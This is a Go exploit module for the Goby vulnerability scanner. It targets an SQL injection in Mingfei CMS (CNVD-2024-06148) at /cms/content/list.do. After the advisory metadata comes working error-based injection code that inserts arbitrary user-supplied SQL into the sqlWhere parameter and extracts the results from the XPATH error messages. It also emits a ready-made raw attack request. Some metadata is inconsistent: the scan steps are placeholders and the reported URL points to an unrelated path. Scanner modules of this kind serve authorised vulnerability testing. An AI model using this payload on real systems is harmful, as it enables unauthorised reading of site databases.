package exploits

import (
	"errors"
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Mingfei CMS /cms/content/list.do Interface sqlWhere Parameter SQL Injection Vulnerability (CNVD-2024-06148)",
    "Description": "<p>Mingfei CMS is a set of lightweight open source content management system developed based on java, Mingfei CMS is simple, secure, open source, free, can run on Linux, Windows, MacOSX, Solaris and other platforms, focusing on providing solutions for companies, enterprises, and individual webmasters to quickly build websites.</p><p>There is a sql injection vulnerability in the CMS /cms/content/list.do interface of Mingfei, which can be exploited to obtain sensitive information.</p>",
    "Product": "铭飞CMS",
    "Homepage": "https://mingsoft.net/",
    "DisclosureDate": "2024-05-11",
    "PostTime": "2024-05-30",
    "Author": "兰公子",
    "FofaQuery": "body=\"铭飞MCMS\" || body=\"/mdiy/formData/save.do\" || body=\"static/plugins/ms/1.0.0/ms.js\"",
    "GobyQuery": "body=\"铭飞MCMS\" || body=\"/mdiy/formData/save.do\" || body=\"static/plugins/ms/1.0.0/ms.js\"",
    "Level": "3",
    "Impact": "<p>There is a sql injection vulnerability in the CMS /cms/content/list.do interface of Mingfei, which can be exploited to obtain sensitive information.</p>",
    "Recommendation": "<p>The vendor has released a vulnerability fix, please pay attention to the update in time: <a href=\"https://gitee.com/mingSoft/MCMS/\">https://gitee.com/mingSoft/MCMS/</a></p>",
    "References": [
        "https://blog.csdn.net/qq_41904294/article/details/138341537?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "database()",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        "CNVD-2024-06148"
    ],
    "CVSSScore": "8.2",
    "Translation": {
        "CN": {
            "Name": "铭飞CMS /cms/content/list.do 接口 sqlWhere 参数 SQL 注入漏洞（CNVD-2024-06148）",
            "Product": "铭飞CMS",
            "Description": "<p>铭飞CMS是一款基于java开发的一套轻量级开源内容管理系统,铭飞CMS简洁、安全、开源、免费,可运行在Linux、Windows、MacOSX、Solaris等各种平台上,专注为公司企业、个人站长快速建站提供解决方案。</p><p>铭飞CMS&nbsp;/cms/content/list.do&nbsp;接口存在&nbsp;sql&nbsp;注入漏洞，能够利用该漏洞获取敏感信息。<br></p>",
            "Recommendation": "<p>厂商发布漏洞修复，请及时关注更新： <a href=\"https://gitee.com/mingSoft/MCMS/\" target=\"_blank\">https://gitee.com/mingSoft/MCMS/</a><br></p>",
            "Impact": "<p>铭飞CMS&nbsp;/cms/content/list.do&nbsp;接口存在&nbsp;sql&nbsp;注入漏洞，能够利用该漏洞获取敏感信息。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Mingfei CMS /cms/content/list.do Interface sqlWhere Parameter SQL Injection Vulnerability (CNVD-2024-06148)",
            "Product": "铭飞CMS",
            "Description": "<p>Mingfei CMS is a set of lightweight open source content management system developed based on java, Mingfei CMS is simple, secure, open source, free, can run on Linux, Windows, MacOSX, Solaris and other platforms, focusing on providing solutions for companies, enterprises, and individual webmasters to quickly build websites.</p><p>There is a sql injection vulnerability in the CMS /cms/content/list.do interface of Mingfei, which can be exploited to obtain sensitive information.</p>",
            "Recommendation": "<p>The vendor has released a vulnerability fix, please pay attention to the update in time:&nbsp;<a href=\"https://gitee.com/mingSoft/MCMS/\">https://gitee.com/mingSoft/MCMS/</a><br></p>",
            "Impact": "<p>There is a sql injection vulnerability in the CMS /cms/content/list.do interface of Mingfei, which can be exploited to obtain sensitive information.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10956"
}`

	sendPayload1715914613 := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		uri := `/cms/content/list.do`
		payload := `sqlWhere=[{"action"%3a"","field"%3a"1+AND+EXTRACTVALUE(4095,CONCAT(0x7e,(` + sql + `),0x7e))","el":"eq","model":"contentTitle","name":"123","type":"input","value":"a"}]`
		cfg := httpclient.NewPostRequestConfig(uri)
		cfg.VerifyTls = false
		cfg.Timeout = 15
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.Data = payload

		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return nil, err
		}
		if resp.StatusCode != 500 {
			return nil, errors.New("not response 500")
		}
		if !strings.Contains(resp.Utf8Html, "XPATH") {
			return nil, errors.New("not info")
		}
		return resp, nil

	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			sendPayload := sendPayload1715914613
			feature := goutils.RandomHexString(8)
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `concat(0x7e,'` + feature + `',DATABASE(),'` + feature + `')`
			_, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + `/dashboard/pagingQueryData`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sendPayload := sendPayload1715914613
			makeRegularAAAA := func(RegularContent string, RegularUrl string) (string, error) {
				reRequestAAAA := regexp.MustCompile(RegularUrl)
				if !reRequestAAAA.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequestAAAA.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			feature := goutils.RandomHexString(8)
			sql := goutils.B2S(stepLogs.Params["sql"])
			sql = `concat(0x7e,'` + feature + `',` + sql + `,'` + feature + `')`
			if attackType == "sql" {
				resp, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				respResult, err := makeRegularAAAA(resp.Utf8Html, feature+`(.*?)`+feature)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				expResult.Output = respResult
				expResult.Success = true
			} else if attackType == "sqlPoint" {
				_, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				expResult.Success = true
				expResult.Output = `POST /cms/content/list.do HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Connection: close

` + `sqlWhere=[{"action"%3a"","field"%3a"1+AND+EXTRACTVALUE(4095,CONCAT(0x7e,(` + sql + `),0x7e))","el":"eq","model":"contentTitle","name":"123","type":"input","value":"a"}]`
			}
			return expResult
		},
	))
}
